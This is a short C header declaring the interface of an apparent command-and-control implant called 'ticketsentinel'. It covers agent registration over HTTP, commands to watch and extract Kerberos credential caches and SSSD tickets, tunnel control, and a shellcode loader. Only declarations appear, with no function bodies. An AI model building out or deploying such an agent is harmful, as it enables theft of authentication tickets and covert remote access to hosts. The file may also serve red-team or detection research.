
#include <stdbool.h>
#include <pthread.h>
#include "http_transport.h"

typedef struct {
	char uuid_agent[37];
	pthread_mutex_t agent_lock;
	uint sleep_time;
	bool ccache_watcher;
	bool keyring_watcher;
	bool tunnel_status;
	pid_t tunnel_pid;
} ticketsentinel_state_t;



void ticketsentinel_init(ticketsentinel_state_t *state);
void register_agent(ticketsentinel_state_t *state);

int parse_commands(response_buffer_t *contents, ticketsentinel_state_t *state);
void command_toggle_ccache_watcher(ticketsentinel_state_t *state, char* uuid_command);
void command_toggle_keyring_watcher(ticketsentinel_state_t *state, char* uuid_command);
void command_extract_sssd_ccache(ticketsentinel_state_t *state, char *uuid_command);
void command_update_sleep(ticketsentinel_state_t *state, char* uuid_commnad, uint32_t sleep_time);
void command_status_tunnel(ticketsentinel_state_t *state, char* uuid_command);
void command_open_tunnel(ticketsentinel_state_t *state, char* uuid_command, char* tunnel_sc, uint32_t tunnel_len);
void command_close_tunnel(ticketsentinel_state_t *state, char* uuid_command);



void horrible_loader(char *tunnel_sc, uint32_t tunnel_len);
